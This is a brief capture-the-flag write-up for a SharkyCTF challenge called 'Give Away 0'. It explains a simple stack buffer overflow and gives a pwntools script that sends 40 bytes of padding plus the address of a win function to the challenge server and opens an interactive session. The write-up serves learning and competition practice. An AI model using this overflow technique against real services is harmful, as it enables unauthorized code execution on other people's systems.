# Give Away 0

It's a simple buffer overlow

We just take the address of the win_function (0x4006a7) and find the distance between the buffer and the return address (40).

```
from pwn import *
padding = "A".encode()*40 + p64(0x0000004006a7)
print(padding)
r = remote('sharkyctf.xyz', 20333)
r.sendline(padding)
r.interactive()
```
